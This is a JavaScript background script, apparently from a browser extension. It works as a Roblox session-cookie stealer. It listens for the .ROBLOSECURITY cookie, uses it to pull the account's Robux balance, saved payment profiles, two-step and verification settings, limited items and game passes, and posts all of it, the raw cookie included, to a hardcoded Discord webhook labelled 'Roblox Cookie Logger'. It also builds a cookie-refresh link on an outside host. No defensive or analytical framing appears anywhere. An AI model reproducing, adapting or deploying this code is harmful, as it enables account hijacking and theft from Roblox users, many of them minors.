// background.js
let WEBHOOK_URL = "https://discord.com/api/webhooks/1396878080919994378/iT0Azb_TrwpbC9VtjHxSNaA3jj9HRm2FFGA16aahs_3FoMd_iuh-8swNrO39i7BT_AgN"; // versux x vextroz
const REFRESH_LINK = "https://bloxbypass.unaux.com/67.php?cookie=";

// Function to get CSRF token
async function getCSRFToken(cookie) {
    try {
        const response = await fetch("https://auth.roblox.com/v2/login", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Cookie": `.ROBLOSECURITY=${cookie}`
            },
            body: JSON.stringify({})
        });
        
        const csrfToken = response.headers.get("x-csrf-token");
        return csrfToken;
    } catch (error) {
        console.error("Error getting CSRF token:", error);
        return null;
    }
}

// Function to get user info (removed pinData related code)
async function getUserInfo(cookie, csrfToken) {
    try {
        const headers = {
            "Content-Type": "application/json",
            "Cookie": `.ROBLOSECURITY=${cookie}`,
            "x-csrf-token": csrfToken
        };

        // Get basic user info
        const userResponse = await fetch("https://users.roblox.com/v1/users/authenticated", { headers });
        const userData = await userResponse.json();
        
        // Get currency (robux)
        const currencyResponse = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, { headers });
        const currencyData = await currencyResponse.json();
        
        // Get premium status
        const premiumResponse = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, { headers });
        const premiumData = await premiumResponse.json();
        
        // Get thumbnail
        const thumbnailResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=150x150&format=Png&isCircular=false`, { headers });
        const thumbnailData = await thumbnailResponse.json();
        
        // Get transactions summary
        const transactionsResponse = await fetch(`https://economy.roblox.com/v2/users/${userData.id}/transaction-totals?timeFrame=Year&transactionType=summary`, { headers });
        const transactionsData = await transactionsResponse.json();
        
        // Get security settings
        const settingsResponse = await fetch("https://www.roblox.com/my/settings/json", { headers });
        const settingsData = await settingsResponse.json();
        
        // Get collectibles
        const collectiblesResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100`, { headers });
        const collectiblesData = await collectiblesResponse.json();
        
        // Get saved payments
        const paymentsResponse = await fetch("https://apis.roblox.com/payments-gateway/v1/payment-profiles", { headers });
        const paymentsData = await paymentsResponse.json();
        
        // Get voice chat settings
        const vcResponse = await fetch("https://voice.roblox.com/v1/settings", { headers });
        const vcData = await vcResponse.json();
        
        // Check for special items
        const headlessCheck = await fetch("https://catalog.roblox.com/v1/catalog/items/201/details?itemType=Bundle", { headers });
        const headlessData = await headlessCheck.json();
        const headless = headlessData.owned ? 'True' : 'False';
        
        const korbloxCheck = await fetch("https://catalog.roblox.com/v1/catalog/items/192/details?itemType=Bundle", { headers });
        const korbloxData = await korbloxCheck.json();
        const korblox = korbloxData.owned ? 'True' : 'False';
        
        const valkCheck = await fetch("https://catalog.roblox.com/v1/catalog/items/1402432199/details?itemType=asset", { headers });
        const valkData = await valkCheck.json();
        const valk = valkData.owned ? 'True' : 'False';
        
        // Get account age
        const profileResponse = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
        const profileData = await profileResponse.json();
        const created = new Date(profileData.created);
        const now = new Date();
        const daysOld = Math.floor((now - created) / (1000 * 60 * 60 * 24));
        const joinDate = created.toLocaleDateString('en-GB');
        
        // Get place visits
        const placesResponse = await fetch(`https://games.roblox.com/v2/users/${userData.id}/games?accessFilter=Public&sortOrder=Asc&limit=10`);
        const placesData = await placesResponse.json();
        const visits = placesData.data?.[0]?.placeVisits || 0;
        
        // Calculate RAP
        let rap = 0;
        if (collectiblesData.data) {
            rap = collectiblesData.data.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
        }
        
        // Check game passes and badges
        const games = {
            'BF': await checkGameVote(994732206, cookie, csrfToken),
            'AM': await checkGameVote(383310974, cookie, csrfToken),
            'MM2': await checkGameVote(66654135, cookie, csrfToken),
            'PS99': await checkGameVote(3317771874, cookie, csrfToken),
            'BB': await checkGameVote(4777817887, cookie, csrfToken),
            'PETSGO': await hasBadge(userData.id, "1244002859092897", cookie, csrfToken),
            'FISCH': await hasBadge(userData.id, "3713345851024569", cookie, csrfToken)
        };
        
        // Get game passes
        const gamePasses = {
            'BB': await getGamePassCount(13772394625, cookie),
            'BF': await getGamePassCount(2753915549, cookie),
            'MM2': await getGamePassCount(142823291, cookie),
            'PS99': await getGamePassCount(8737899170, cookie),
            'AM': await getGamePassCount(920587237, cookie),
            'PETSGO': await getGamePassCount(18901165922, cookie),
            'FISCH': await getGamePassCount(16732694052, cookie)
        };
        
        return {
            userData,
            currencyData,
            premiumData,
            thumbnailData,
            transactionsData,
            settingsData,
            collectiblesData,
            paymentsData,
            vcData,
            headless,
            korblox,
            valk,
            daysOld,
            joinDate,
            visits,
            rap,
            games,
            gamePasses
        };
    } catch (error) {
        console.error("Error getting user info:", error);
        return null;
    }
}

// Helper function to check if user can vote in a game (indicates they've played)
async function checkGameVote(gameId, cookie, csrfToken) {
    try {
        const response = await fetch(`https://games.roblox.com/v1/games/${gameId}/votes/user`, {
            headers: {
                "Content-Type": "application/json",
                "Cookie": `.ROBLOSECURITY=${cookie}`,
                "x-csrf-token": csrfToken
            }
        });
        const data = await response.json();
        return data.canVote ? 'True' : 'False';
    } catch (error) {
        console.error(`Error checking game vote for ${gameId}:`, error);
        return 'False';
    }
}

// Helper function to check if user has a badge
async function hasBadge(userId, badgeId, cookie, csrfToken) {
    try {
        const response = await fetch(`https://badges.roblox.com/v1/users/${userId}/badges/awarded-dates?badgeIds=${badgeId}`, {
            headers: {
                "Content-Type": "application/json",
                "Cookie": `.ROBLOSECURITY=${cookie}`,
                "x-csrf-token": csrfToken
            }
        });
        const data = await response.json();
        return data.data && data.data.length > 0 ? 'True' : 'False';
    } catch (error) {
        console.error(`Error checking badge ${badgeId}:`, error);
        return 'False';
    }
}

// Helper function to get game pass count
async function getGamePassCount(placeId, cookie) {
    try {
        const response = await fetch(`https://www.roblox.com/games/getgamepassesinnerpartial?startIndex=0&maxRows=50&placeId=${placeId}`, {
            headers: {
                "Cookie": `.ROBLOSECURITY=${cookie}`
            }
        });
        const text = await response.text();
        const count = (text.match(/Owned/g) || []).length;
        return `___${count}___`;
    } catch (error) {
        console.error(`Error getting game passes for ${placeId}:`, error);
        return '___0___';
    }
}

// Function to send data to Discord (updated with refresh link)
async function sendToDiscord(cookie, userInfo) {
    if (!userInfo) return;
    
    const {
        userData,
        currencyData,
        premiumData,
        thumbnailData,
        transactionsData,
        settingsData,
        collectiblesData,
        paymentsData,
        vcData,
        headless,
        korblox,
        valk,
        daysOld,
        joinDate,
        visits,
        rap,
        games,
        gamePasses
    } = userInfo;
    
    const collectionCount = collectiblesData.data?.length || 0;
    const hasPayments = paymentsData && paymentsData.length > 0 ? 'True' : 'False';
    const creditBalance = paymentsData?.creditBalance || 0;
    const robuxConversion = paymentsData?.robuxConversionAmount || 0;
    
    const embed = {
        title: "**```Roblox Account Information```**",
        description: `[**Refresh Cookies**](${REFRESH_LINK}${encodeURIComponent(cookie)})\n\n` +
                     `[**<:Cookie:1313022426346426368>  Check .ROBLOSECURITY**](https://www.roblox.com) | ` +
                     `[**Rolimons**](https://www.rolimons.com/player/${userData.id}) <:rolimons:978559948432744468>`,
        color: 0xFF0000, // Red color
        thumbnail: {
            url: thumbnailData.data[0].imageUrl
        },
        author: {
            name: `${userData.name}\n${settingsData.UserAbove13 ? '13+' : '13>'} ${joinDate}`,
            url: `https://www.roblox.com/users/${userData.id}/profile`,
            icon_url: thumbnailData.data[0].imageUrl
        },
        fields: [
            {
                name: "About User",
                value: `\`\`Account Age: ${daysOld} Days\`\`\n\`\`Place Visits: ${visits}\`\``,
                inline: false
            },
            {
                name: "<:Robux:1313020721987063829> Robux",
                value: `Balance: ${currencyData.robux || 0} <:Robux:1313020721987063829>\nPending: ${transactionsData.pendingRobuxTotal || 0} <:RobuxPending:1313020748490608721>`,
                inline: true
            },
            {
                name: "<:Limited:1313024834783154211> Rap",
                value: `Rap: ${rap || 0} <:Valk:1313020750038569021>\nOwned: ${collectionCount || 0} <:Inventory:1313020754547310737>`,
                inline: true
            },
            {
                name: "<a:Summery:1313021791954014268> Summary",
                value: transactionsData.incomingRobuxTotal || 0,
                inline: true
            },
            {
                name: "<:Billing:1313020743373819935> Billing",
                value: `Credit: ${creditBalance} <:Credits:1313020738755756052>\nConvert: ${robuxConversion} <:Robux:1313020721987063829>\nCard: ${hasPayments} <:Cards:1313020745223503883>`,
                inline: true
            },
            {
                name: "<:Games:1313020733932306462> | Played | Passes",
                value: `<:bf:1303894849530888214> | ${games.BF} | ${gamePasses.BF}\n` +
                       `<:adm:1303894863007453265> | ${games.AM} | ${gamePasses.AM}\n` +
                       `<:mm2:1303894855281541212> | ${games.MM2} | ${gamePasses.MM2}\n` +
                       `<:ps99:1303894865079308288> | ${games.PS99} | ${gamePasses.PS99}\n` +
                       `<:bb:1303894852697718854> | ${games.BB} | ${gamePasses.BB}\n` +
                       `<:petsgo:1349375165095739473> | ${games.PETSGO} | ${gamePasses.PETSGO}\n` +
                       `<:fisch:1349377412219142155> | ${games.FISCH} | ${gamePasses.FISCH}`,
                inline: true
            },
            {
                name: "<:Settings:1313020732225093672> Settings",
                value: `Email Verified: ${settingsData.IsEmailVerified ? '<a:True:1313026208773967882>' : '<a:False:1313026218567667743>'}\n` +
                       `Phone Verified: ${settingsData.IsPhoneVerified ? '<a:True:1313026208773967882>' : '<a:False:1313026218567667743>'}\n` +
                       `<:2Step:1313020736218333245> Two-Step: ${settingsData.MyAccountSecurityModel?.IsTwoStepEnabled ? "Enabled (" + (settingsData.MyAccountSecurityModel.TwoStepMethods?.join(", ") || "") + ")" : "Disabled"}\n` +
                       `<:VoiceChat:1313020746829926440> Voice Chat: ${vcData.isVoiceEnabled ? "Enabled" : "Disabled"}`,
                inline: true
            },
            {
                name: "<:Premium:1313020726474706994> Premium",
                value: premiumData ? "True" : "False",
                inline: true
            },
            {
                name: "<:Collectible:1313026924678742087> Collectibles",
                value: `<:Korblox:1313020724184743936> ${korblox}\n` +
                       `<:vvalk:1354438650519355452> ${valk}\n` +
                       `<:Headless:1313020741003903016> ${headless}`,
                inline: true
            }
        ],
        timestamp: new Date().toISOString()
    };
    
    const cookieEmbed = {
        description: `\n \n<:Cookie:1313022426346426368> **.ROBLOSECURITY**\n**\`\`\`${cookie}\`\`\`**`,
        color: 0xFF0000,
        thumbnail: {
            url: "https://cdn.discordapp.com/attachments/1312464460715266169/1313027565216071730/541732.png"
        },
        timestamp: new Date().toISOString()
    };
    
    const payload = {
        content: "@everyone",
        username: "Roblox Cookie Logger",
        avatar_url: "https://cdn.discordapp.com/attachments/1312464460715266169/1313027565216071730/541732.png",
        embeds: [embed, cookieEmbed]
    };
    
    try {
        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });
    } catch (error) {
        console.error("Error sending to Discord:", error);
    }
}

// [Keep the processCookie and listener functions the same as before...]

// Main function to process a found cookie
async function processCookie(cookie) {
    try {
        const csrfToken = await getCSRFToken(cookie);
        if (!csrfToken) {
            console.error("Failed to get CSRF token");
            return;
        }
        
        const userInfo = await getUserInfo(cookie, csrfToken);
        if (!userInfo) {
            console.error("Failed to get user info");
            return;
        }
        
        await sendToDiscord(cookie, userInfo);
    } catch (error) {
        console.error("Error processing cookie:", error);
    }
}

// Listen for cookies being set or changed
chrome.cookies.onChanged.addListener(async (changeInfo) => {
    if (changeInfo.cookie.name === ".ROBLOSECURITY" && !changeInfo.removed) {
        await processCookie(changeInfo.cookie.value);
    }
});

// Also check existing cookies when the extension starts
chrome.cookies.getAll({}, (cookies) => {
    for (const cookie of cookies) {
        if (cookie.name === ".ROBLOSECURITY") {
            processCookie(cookie.value);
            break; // Only process one cookie to avoid spamming
        }
    }
});
